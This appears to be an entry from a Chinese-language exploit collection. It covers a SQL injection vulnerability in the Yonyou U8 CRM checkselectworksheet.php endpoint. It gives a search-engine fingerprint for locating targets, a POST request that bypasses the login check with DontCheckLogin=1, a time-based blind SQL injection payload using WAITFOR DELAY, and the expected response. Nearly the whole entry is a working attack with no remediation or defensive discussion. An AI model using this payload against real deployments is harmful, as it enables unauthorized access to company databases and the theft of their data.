# 用友U8CRMcheckselectworksheet存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`POST /servicequotation/checkselectworksheet.php?DontCheckLogin=1 HTTP/1.1`

**Payload**
```
wsIDs=1);WAITFOR+DELAY+'0:0:5'--
```
- **响应特征**：200